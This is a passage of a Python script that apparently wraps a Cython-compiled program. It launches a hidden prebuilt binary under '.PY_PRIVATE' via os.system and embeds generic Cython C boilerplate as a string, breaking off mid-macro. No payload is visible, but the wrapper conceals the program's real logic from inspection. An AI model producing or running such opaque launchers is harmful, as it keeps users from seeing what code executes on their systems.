
import os
import sys

PSH_TEAM_KEY = "بخ 👀"

EXECUTE_FILE = ".PY_PRIVATE/20250204105453895"
PREFIX = sys.prefix
EXPORT_PYTHONHOME = 'export PYTHONHOME='+PREFIX
EXPORT_PYTHON_EXECUTABLE = 'export PYTHON_EXECUTABLE='+sys.executable

RUN = "./"+EXECUTE_FILE

if os.path.isfile(EXECUTE_FILE):
    os.system(EXPORT_PYTHONHOME+" && "+EXPORT_PYTHON_EXECUTABLE+" && "+RUN)
    exit(0)

C_SOURCE = r'''#ifndef PY_SSIZE_T_CLEAN
#define PY_SSIZE_T_CLEAN
#endif /* PY_SSIZE_T_CLEAN */
#include "Python.h"
#ifndef Py_PYTHON_H
    #error Python headers needed to compile C extensions, please install development version of Python.
#elif PY_VERSION_HEX < 0x02060000 || (0x03000000 <= PY_VERSION_HEX && PY_VERSION_HEX < 0x03030000)
    #error Cython requires Python 2.6+ or Python 3.3+.
#else
#define CYTHON_ABI "0_29_33"
#define CYTHON_HEX_VERSION 0x001D21F0
#define CYTHON_FUTURE_DIVISION 1
#include <stddef.h>
#ifndef offsetof
  #define offsetof(type, member) ( (size_t) & ((type*)0) -> member )
#endif
#if !defined(WIN32) && !defined(MS_WINDOWS)
  #ifndef __stdcall
    #define __stdcall
  #endif
  #ifndef __cdecl
    #define __cdecl
  #endif
  #ifndef __fastcall
    #define __fastcall
  #endif
#endif
#ifndef DL_IMPORT
  #define DL_IMPORT(t) t
#endif
#ifndef DL_EXPORT
  #define DL_EXPORT(t) t
#endif
#define __PYX_COMMA ,
#ifndef HAVE_LONG_LONG
  #if PY_VERSION_HEX >= 0x02070000
    #define HAVE_LONG_LONG
  #endif
#endif
#ifndef PY_LONG_LONG
  #define PY_LONG_LONG LONG_LONG
#endif
#ifndef Py_HUGE_VAL
  #define Py_HUGE_VAL HUGE_VAL
#endif
#ifdef PYPY_VERSION
  #define CYTHON_COMPILING_IN_PYPY 1
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_NOGIL 0
  #undef CYTHON_USE_TYPE_SLOTS
  #define CYTHON_USE_TYPE_SLOTS 0
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #if PY_VERSION_HEX < 0x03050000
    #undef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 0
  #elif !defined(CYTHON_USE_ASYNC_SLOTS)
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #undef CYTHON_USE_UNICODE_INTERNALS
  #define CYTHON_USE_UNICODE_INTERNALS 0
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #undef CYTHON_AVOID_BORROWED_REFS
  #define CYTHON_AVOID_BORROWED_REFS 1
  #undef CYTHON_ASSUME_SAFE_MACROS
  #define CYTHON_ASSUME_SAFE_MACROS 0
  #undef CYTHON_UNPACK_METHODS
  #define CYTHON_UNPACK_METHODS 0
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #undef CYTHON_PEP489_MULTI_PHASE_INIT
  #define CYTHON_PEP489_MULTI_PHASE_INIT 0
  #undef CYTHON_USE_TP_FINALIZE
  #define CYTHON_USE_TP_FINALIZE 0
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0
  #endif
#elif defined(PYSTON_VERSION)
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 1
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_NOGIL 0
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #undef CYTHON_USE_ASYNC_SLOTS
  #define CYTHON_USE_ASYNC_SLOTS 0
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #undef CYTHON_PEP489_MULTI_PHASE_INIT
  #define CYTHON_PEP489_MULTI_PHASE_INIT 0
  #undef CYTHON_USE_TP_FINALIZE
  #define CYTHON_USE_TP_FINALIZE 0
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0
  #endif
#elif defined(PY_NOGIL)
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_NOGIL 1
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #ifndef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT
    #define CYTHON_PEP489_MULTI_PHASE_INIT 1
  #endif
  #ifndef CYTHON_USE_TP_FINALIZE
    #define CYTHON_USE_TP_FINALIZE 1
  #endif
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
#else
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 1
  #define CYTHON_COMPILING_IN_NOGIL 0
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #if PY_VERSION_HEX < 0x02070000
    #undef CYTHON_USE_PYTYPE_LOOKUP
    #define CYTHON_USE_PYTYPE_LOOKUP 0
  #elif !defined(CYTHON_USE_PYTYPE_LOOKUP)
    #define CYTHON_USE_PYTYPE_LOOKUP 1
  #endif
  #if PY_MAJOR_VERSION < 3
    #undef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 0
  #elif !defined(CYTHON_USE_ASYNC_SLOTS)
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #if PY_VERSION_HEX < 0x02070000
    #undef CYTHON_USE_PYLONG_INTERNALS
    #define CYTHON_USE_PYLONG_INTERNALS 0
  #elif !defined(CYTHON_USE_PYLONG_INTERNALS)
    #define CYTHON_USE_PYLONG_INTERNALS 1
  #endif
  #ifndef CYTHON_USE_PYLIST_INTERNALS
    #define CYTHON_USE_PYLIST_INTERNALS 1
  #endif
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #if PY_VERSION_HEX < 0x030300F0 || PY_VERSION_HEX >= 0x030B00A2
    #undef CYTHON_USE_UNICODE_WRITER
    #define CYTHON_USE_UNICODE_WRITER 0
  #elif !defined(CYTHON_USE_UNICODE_WRITER)
    #define CYTHON_USE_UNICODE_WRITER 1
  #endif
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #if PY_VERSION_HEX >= 0x030B00A4
    #undef CYTHON_FAST_THREAD_STATE
    #define CYTHON_FAST_THREAD_STATE 0
  #elif !defined(CYTHON_FAST_THREAD_STATE)
    #define CYTHON_FAST_THREAD_STATE 1
  #endif
  #ifndef CYTHON_FAST_PYCALL
    #define CYTHON_FAST_PYCALL (PY_VERSION_HEX < 0x030A0000)
  #endif
  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT
    #define CYTHON_PEP489_MULTI_PHASE_INIT (PY_VERSION_HEX >= 0x03050000)
  #endif
  #ifndef CYTHON_USE_TP_FINALIZE
    #define CYTHON_USE_TP_FINALIZE (PY_VERSION_HEX >= 0x030400a1)
  #endif
  #ifndef CYTHON_USE_DICT_VERSIONS
    #define CYTHON_USE_DICT_VERSIONS (PY_VERSION_HEX >= 0x030600B1)
  #endif
  #if PY_VERSION_HEX >= 0x030B00A4
    #undef CYTHON_USE_EXC_INFO_STACK
    #define CYTHON_USE_EXC_INFO_STACK 0
  #elif !defined(CYTHON_USE_EXC_INFO_STACK)
    #define CYTHON_USE_EXC_INFO_STACK (PY_VERSION_HEX >= 0x030700A3)
  #endif
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 1
  #endif
#endif
#if !defined(CYTHON_FAST_PYCCALL)
#define CYTHON_FAST_PYCCALL  (CYTHON_FAST_PYCALL && PY_VERSION_HEX >= 0x030600B1)
#endif
#if CYTHON_USE_PYLONG_INTERNALS
  #if PY_MAJOR_VERSION < 3
    #include "longintrepr.h"
  #endif
  #undef SHIFT
  #undef BASE
  #undef MASK
  #ifdef SIZEOF_VOID_P
    enum { __pyx_check_sizeof_voidp = 1 / (int)(SIZEOF_VOID_P == sizeof(void*)) };
  #endif
#endif
#ifndef __has_attribute
  #define __has_attribute(x) 0
#endif
#ifndef __has_cpp_attribute
  #define __has_cpp_attribute(x) 0
#endif
#ifndef CYTHON_RESTRICT
  #if defined(__GNUC__)
    #define CYTHON_RESTRICT __restrict__
  #elif defined(_MSC_VER) && _MSC_VER >= 1400
    #define CYTHON_RESTRICT __restrict
  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define CYTHON_RESTRICT restrict
  #else
    #define CYTHON_RESTRICT
  #endif
#endif
#ifndef CYTHON_UNUSED
# if defined(__GNUC__)
#   if !(defined(__cplusplus)) || (__GNUC__ > 3 || (__GNUC__ == 3 && __GNUC_MINOR__ >= 4))
#     define CYTHON_UNUSED __attribute__ ((__unused__))
#   else
#     define CYTHON_UNUSED
#   endif
# elif defined(__ICC) || (defined(__INTEL_COMPILER) && !defined(_MSC_VER))
#   define CYTHON_UNUSED __attribute__ ((__unused__))
# else
#   define CYTHON_UNUSED
# endif
#endif
#ifndef CYTHON_MAYBE_UNUSED_VAR
#  if defined(__cplusplus)
     template<class T> void CYTHON_MAYBE_UNUSED_VAR( const T& ) { }
#  else
#    define CYTHON_MAYBE_UNUSED_VAR(x) (void)(x)
#  endif
#endif
#ifndef CYTHON_NCP_UNUSED
# if CYTHON_COMPILING_IN_CPYTHON
#  define CYTHON_NCP_UNUSED
# else
#  define CYTHON_NCP_UNUSED CYTHON_UNUSED
# endif
#endif
#define __Pyx_void_to_None(void_result) ((void)(void_result), Py_INCREF(Py_None), Py_None)
#ifdef _MSC_VER
    #ifndef _MSC_STDINT_H_
        #if _MSC_VER < 1300
           typedef unsigned char     uint8_t;
           typedef unsigned int      uint32_t;
        #else
           typedef unsigned __int8   uint8_t;
           typedef unsigned __int32  uint32_t;
        #endif
    #endif
#else
   #include <stdint.h>
#endif
#ifndef CYTHON_FALLTHROUGH
  #if defined(__cplusplus) && __cplusplus >= 201103L
    #if __has_cpp_attribute(fallthrough)
      #define CYTHON_FALLTHROUGH [[fallthrough]]
    #elif __has_cpp_attribute(clang::fallthrough)
      #define CYTHON_FALLTHROUGH [[clang::fallthrough]]
    #elif __has_cpp_attribute(gnu::fallthrough)
      #define CYTHON_FALLTHROUGH [[gnu::fallthrough]]
    #endif
  #endif
  #ifndef CYTHON_FALLTHROUGH
    #if __has_attribute(fallthrough)
      #define CYTHON_FALLTHROUGH __attribute__((fallthrough))
    #else
      #define CYTHON_FALLTHROUGH
    #endif
  #endif
  #if defined(__clang__ ) && defined(__apple_build_version__)
    #if __apple_build_version__ < 7000000
      #undef  CYTHON_FALLTHROUGH
      #define CYTHON_FALLTHROUGH
    #endif
  #endif
#endif

#ifndef CYTHON_INLINE
  #if defined(__clang__)
    #define CYTHON_INLINE __inline__ __attribute__ ((__unused__))
  #elif defined(__GNUC__)
    #define CYTHON_INLINE __inline__
  #elif defined(_MSC_VER)
    #define CYTHON_INLINE __inline
  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define CYTHON_INLINE inline
  #else
    #define CYTHON_INLINE
  #endif
#endif

#if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX < 0x02070600 && !defined(Py_OptimizeFlag)
  #define Py_OptimizeFlag 0
#endif
#define __PYX_BUILD_PY_SSIZE_T "n"
#define CYTHON_FORMAT_SSIZE_T "z"
#if PY_MAJOR_VERSION < 3
  #define __Pyx_BUILTIN_MODULE_NAME "__builtin__"
  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\
          PyCode_New(a+k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)
  #define __Pyx_DefaultClassType PyClass_Type
#else
  #define __Pyx_BUILTIN_MODULE_NAME "builtins"
  #define __Pyx_DefaultClassType PyType_Type
#if PY_VERSION_HEX >= 0x030B00A1
    static CYTHON_INLINE PyCodeObject* __Pyx_PyCode_New(int a, int k, int l, int s, int f,
                                                    PyObject *code, PyObject *c, PyObject* n, PyObject *v,
                                                    PyObject *fv, PyObject *cell, PyObject* fn,
                                                    PyObject *name, int fline, PyObject *lnos) {
        PyObject *kwds=NULL, *argcount=NULL, *posonlyargcount=NULL, *kwonlyargcount=NULL;
        PyObject *nlocals=NULL, *stacksize=NULL, *flags=NULL, *replace=NULL, *call_result=NULL, *empty=NULL;
        const char *fn_cstr=NULL;
        const char *name_cstr=NULL;
        PyCodeObject* co=NULL;
        PyObject *type, *value, *traceback;
        PyErr_Fetch(&type, &value, &traceback);
        if (!(kwds=PyDict_New())) goto end;
        if (!(argcount=PyLong_FromLong(a))) goto end;
        if (PyDict_SetItemString(kwds, "co_argcount", argcount) != 0) goto end;
        if (!(posonlyargcount=PyLong_FromLong(0))) goto end;
        if (PyDict_SetItemString(kwds, "co_posonlyargcount", posonlyargcount) != 0) goto end;
        if (!(kwonlyargcount=PyLong_FromLong(k))) goto end;
        if (PyDict_SetItemString(kwds, "co_kwonlyargcount", kwonlyargcount) != 0) goto end;
        if (!(nlocals=PyLong_FromLong(l))) goto end;
        if (PyDict_SetItemString(kwds, "co_nlocals", nlocals) != 0) goto end;
        if (!(stacksize=PyLong_FromLong(s))) goto end;
        if (PyDict_SetItemString(kwds, "co_stacksize", stacksize) != 0) goto end;
        if (!(flags=PyLong_FromLong(f))) goto end;
        if (PyDict_SetItemString(kwds, "co_flags", flags) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_code", code) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_consts", c) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_names", n) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_varnames", v) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_freevars", fv) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_cellvars", cell) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_linetable", lnos) != 0) goto end;
        if (!(fn_cstr=PyUnicode_AsUTF8AndSize(fn, NULL))) goto end;
        if (!(name_cstr=PyUnicode_AsUTF8AndSize(name, NULL))) goto end;
        if (!(co = PyCode_NewEmpty(fn_cstr, name_cstr, fline))) goto end;
        if (!(replace = PyObject_GetAttrString((PyObject*)co, "replace"))) goto cleanup_code_too;
        if (!(empty = PyTuple_New(0))) goto cleanup_code_too; // unfortunately __pyx_empty_tuple isn't available here
        if (!(call_result = PyObject_Call(replace, empty, kwds))) goto cleanup_code_too;
        Py_XDECREF((PyObject*)co);
        co = (PyCodeObject*)call_result;
        call_result = NULL;
        if (0) {
            cleanup_code_too:
            Py_XDECREF((PyObject*)co);
            co = NULL;
        }
        end:
        Py_XDECREF(kwds);
        Py_XDECREF(argcount);
        Py_XDECREF(posonlyargcount);
        Py_XDECREF(kwonlyargcount);
        Py_XDECREF(nlocals);
        Py_XDECREF(stacksize);
        Py_XDECREF(replace);
        Py_XDECREF(call_result);
        Py_XDECREF(empty);
        if (type) {
            PyErr_Restore(type, value, traceback);
        }
        return co;
    }
#else
  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\
          PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)
#endif
  #define __Pyx_DefaultClassType PyType_Type
#endif
#ifndef Py_TPFLAGS_CHECKTYPES
  #define Py_TPFLAGS_CHECKTYPES 0
#endif
#ifndef Py_TPFLAGS_HAVE_INDEX
  #define Py_TPFLAGS_HAVE_INDEX 0
#endif
#ifndef Py_TPFLAGS_HAVE_NEWBUFFER
  #define Py_TPFLAGS_HAVE_NEWBUFFER 0
#endif
#ifndef Py_TPFLAGS_HAVE_FINALIZE
  #define Py_TPFLAGS_HAVE_FINALIZE 0
#endif
#ifndef METH_STACKLESS
  #define METH_STACKLESS 0
#endif
#if PY_VERSION_HEX <= 0x030700A3 || !defined(METH_FASTCALL)
  #ifndef METH_FASTCALL
     #define METH_FASTCALL 0x80
  #endif
  typedef PyObject *(*__Pyx_PyCFunctionFast) (PyObject *self, PyObject *const *args, Py_ssize_t nargs);
  typedef PyObject *(*__Pyx_PyCFunctionFastWithKeywords) (PyObject *self, PyObject *const *args,
                                                          Py_ssize_t nargs, PyObject *kwnames);
#else
  #define __Pyx_PyCFunctionFast _PyCFunctionFast
  #define __Pyx_PyCFunctionFastWithKeywords _PyCFunctionFastWithKeywords
#endif
#if CYTHON_FAST_PYCCALL
#define __Pyx_PyFastCFunction_Check(func)\
    ((PyCFunction_Check(func) && (METH_FASTCALL == (PyCFunction_GET_FLAGS(func) & ~(METH_CLASS | METH_STATIC | METH_COEXIST | METH_KEYWORDS | METH_STACKLESS)))))
#else
#define __Pyx_PyFastCFunction_Check(func) 0
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Malloc)
  #define PyObject_Malloc(s)   PyMem_Malloc(s)
  #define PyObject_Free(p)     PyMem_Free(p)
  #define PyObject_Realloc(p)  PyMem_Realloc(p)
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX < 0x030400A1
  #define PyMem_RawMalloc(n)           PyMem_Malloc(n)
  #define PyMem_RawRealloc(p, n)       PyMem_Realloc(p, n)
  #define PyMem_RawFree(p)             PyMem_Free(p)
#endif
#if CYTHON_COMPILING_IN_PYSTON
  #define __Pyx_PyCode_HasFreeVars(co)  PyCode_HasFreeVars(co)
  #define __Pyx_PyFrame_SetLineNumber(frame, lineno) PyFrame_SetLineNumber(frame, lineno)
#else
  #define __Pyx_PyCode_HasFreeVars(co)  (PyCode_GetNumFree(co) > 0)
  #define __Pyx_PyFrame_SetLineNumber(frame, lineno)  (frame)->f_lineno = (lineno)
#endif
#if !CYTHON_FAST_THREAD_STATE || PY_VERSION_HEX < 0x02070000
  #define __Pyx_PyThreadState_Current PyThreadState_GET()
#elif PY_VERSION_HEX >= 0x03060000
  #define __Pyx_PyThreadState_Current _PyThreadState_UncheckedGet()
#elif PY_VERSION_HEX >= 0x03000000
  #define __Pyx_PyThreadState_Current PyThreadState_GET()
#else
  #define __Pyx_PyThreadState_Current _PyThreadState_Current
#endif
#if PY_VERSION_HEX < 0x030700A2 && !defined(PyThread_tss_create) && !defined(Py_tss_NEEDS_INIT)
#include "pythread.h"
#define Py_tss_NEEDS_INIT 0
typedef int Py_tss_t;
static CYTHON_INLINE int PyThread_tss_create(Py_tss_t *key) {
  *key = PyThread_create_key();
  return 0;
}
static CYTHON_INLINE Py_tss_t * PyThread_tss_alloc(void) {
  Py_tss_t *key = (Py_tss_t *)PyObject_Malloc(sizeof(Py_tss_t));
  *key = Py_tss_NEEDS_INIT;
  return key;
}
static CYTHON_INLINE void PyThread_tss_free(Py_tss_t *key) {
  PyObject_Free(key);
}
static CYTHON_INLINE int PyThread_tss_is_created(Py_tss_t *key) {
  return *key != Py_tss_NEEDS_INIT;
}
static CYTHON_INLINE void PyThread_tss_delete(Py_tss_t *key) {
  PyThread_delete_key(*key);
  *key = Py_tss_NEEDS_INIT;
}
static CYTHON_INLINE int PyThread_tss_set(Py_tss_t *key, void *value) {
  return PyThread_set_key_value(*key, value);
}
static CYTHON_INLINE void * PyThread_tss_get(Py_tss_t *key) {
  return PyThread_get_key_value(*key);
}
#endif
#if CYTHON_COMPILING_IN_CPYTHON || defined(_PyDict_NewPresized)
#define __Pyx_PyDict_NewPresized(n)  ((n <= 8) ? PyDict_New() : _PyDict_NewPresized(n))
#else
#define __Pyx_PyDict_NewPresized(n)  PyDict_New()
#endif
#if PY_MAJOR_VERSION >= 3 || CYTHON_FUTURE_DIVISION
  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_TrueDivide(x,y)
  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceTrueDivide(x,y)
#else
  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_Divide(x,y)
  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceDivide(x,y)
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1 && CYTHON_USE_UNICODE_INTERNALS
#define __Pyx_PyDict_GetItemStr(dict, name)  _PyDict_GetItem_KnownHash(dict, name, ((PyASCIIObject *) name)->hash)
#else
#define __Pyx_PyDict_GetItemStr(dict, name)  PyDict_GetItem(dict, name)
#endif
#if PY_VERSION_HEX > 0x03030000 && defined(PyUnicode_KIND)
  #define CYTHON_PEP393_ENABLED 1
  #if PY_VERSION_HEX >= 0x030C0000
    #define __Pyx_PyUnicode_READY(op)       (0)
  #else
    #define __Pyx_PyUnicode_READY(op)       (likely(PyUnicode_IS_READY(op)) ?\
                                                0 : _PyUnicode_Ready((PyObject *)(op)))
  #endif
  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_LENGTH(u)
  #define __Pyx_PyUnicode_READ_CHAR(u, i) PyUnicode_READ_CHAR(u, i)
  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   PyUnicode_MAX_CHAR_VALUE(u)
  #define __Pyx_PyUnicode_KIND(u)         PyUnicode_KIND(u)
  #define __Pyx_PyUnicode_DATA(u)         PyUnicode_DATA(u)
  #define __Pyx_PyUnicode_READ(k, d, i)   PyUnicode_READ(k, d, i)
  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  PyUnicode_WRITE(k, d, i, ch)
  #if PY_VERSION_HEX >= 0x030C0000
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_LENGTH(u))
  #else
    #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03090000
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : ((PyCompactUnicodeObject *)(u))->wstr_length))
    #else
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : PyUnicode_GET_SIZE(u)))
    #endif
  #endif
#else
  #define CYTHON_PEP393_ENABLED 0
  #define PyUnicode_1BYTE_KIND  1
  #define PyUnicode_2BYTE_KIND  2
  #define PyUnicode_4BYTE_KIND  4
  #define __Pyx_PyUnicode_READY(op)       (0)
  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_SIZE(u)
  #define __Pyx_PyUnicode_READ_CHAR(u, i) ((Py_UCS4)(PyUnicode_AS_UNICODE(u)[i]))
  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   ((sizeof(Py_UNICODE) == 2) ? 65535 : 1114111)
  #define __Pyx_PyUnicode_KIND(u)         (sizeof(Py_UNICODE))
  #define __Pyx_PyUnicode_DATA(u)         ((void*)PyUnicode_AS_UNICODE(u))
  #define __Pyx_PyUnicode_READ(k, d, i)   ((void)(k), (Py_UCS4)(((Py_UNICODE*)d)[i]))
  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  (((void)(k)), ((Py_UNICODE*)d)[i] = ch)
  #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_SIZE(u))
#endif
#if CYTHON_COMPILING_IN_PYPY
  #define __Pyx_PyUnicode_Concat(a, b)      PyNumber_Add(a, b)
  #define __Pyx_PyUnicode_ConcatSafe(a, b)  PyNumber_Add(a, b)
#else
  #define __Pyx_PyUnicode_Concat(a, b)      PyUnicode_Concat(a, b)
  #define __Pyx_PyUnicode_ConcatSafe(a, b)  ((unlikely((a) == Py_None) || unlikely((b) == Py_None)) ?\
      PyNumber_Add(a, b) : __Pyx_PyUnicode_Concat(a, b))
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyUnicode_Contains)
  #define PyUnicode_Contains(u, s)  PySequence_Contains(u, s)
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyByteArray_Check)
  #define PyByteArray_Check(obj)  PyObject_TypeCheck(obj, &PyByteArray_Type)
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Format)
  #define PyObject_Format(obj, fmt)  PyObject_CallMethod(obj, "__format__", "O", fmt)
#endif
#define __Pyx_PyString_FormatSafe(a, b)   ((unlikely((a) == Py_None || (PyString_Check(b) && !PyString_CheckExact(b)))) ? PyNumber_Remainder(a, b) : __Pyx_PyString_Format(a, b))
#define __Pyx_PyUnicode_FormatSafe(a, b)  ((unlikely((a) == Py_None || (PyUnicode_Check(b) && !PyUnicode_CheckExact(b)))) ? PyNumber_Remainder(a, b) : PyUnicode_Format(a, b))
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyString_Format(a, b)  PyUnicode_Format(a, b)
#else
  #define __Pyx_PyString_Format(a, b)  PyString_Format(a, b)
#endif
#if PY_MAJOR_VERSION < 3 && !defined(PyObject_ASCII)
  #define PyObject_ASCII(o)            PyObject_Repr(o)
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyBaseString_Type            PyUnicode_Type
  #define PyStringObject               PyUnicodeObject
  #define PyString_Type                PyUnicode_Type
  #define PyString_Check               PyUnicode_Check
  #define PyString_CheckExact          PyUnicode_CheckExact
#ifndef PyObject_Unicode
  #define PyObject_Unicode             PyObject_Str
#endif
#endif
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyBaseString_Check(obj) PyUnicode_Check(obj)
  #define __Pyx_PyBaseString_CheckExact(obj) PyUnicode_CheckExact(obj)
#else
  #define __Pyx_PyBaseString_Check(obj) (PyString_Check(obj) || PyUnicode_Check(obj))
  #define __Pyx_PyBaseString_CheckExact(obj) (PyString_CheckExact(obj) || PyUnicode_CheckExact(obj))
#endif
#ifndef PySet_CheckExact
  #define PySet_CheckExact(obj)        (Py_TYPE(obj) == &PySet_Type)
#endif
#if PY_VERSION_HEX >= 0x030900A4
  #define __Pyx_SET_REFCNT(obj, refcnt) Py_SET_REFCNT(obj, refcnt)
  #define __Pyx_SET_SIZE(obj, size) Py_SET_SIZE(obj, size)
#else
  #define __Pyx_SET_REFCNT(obj, refcnt) Py_REFCNT(obj) = (refcnt)
